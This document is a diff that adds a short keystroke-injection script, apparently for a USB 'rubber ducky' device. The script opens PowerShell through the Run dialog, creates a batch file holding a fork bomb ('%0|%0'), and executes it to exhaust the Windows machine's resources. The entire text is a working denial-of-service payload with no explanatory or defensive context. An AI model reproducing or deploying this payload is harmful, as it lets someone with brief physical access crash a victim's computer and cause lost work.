@@ -1,0 +1,15 @@
+REM open terminal 
+DELAY 2000
+GUI r
+DELAY 2000
+STRING powershell
+ENTER
+DELAY 2000
+
+STRING New-Item -Path ./forkbomb.bat -Type file -Value "%0|%0"
+DELAY 600
+ENTER
+DELAY 600
+STRING .\forkbomb.bat | .\forkbomb.bat
+ENTER
+
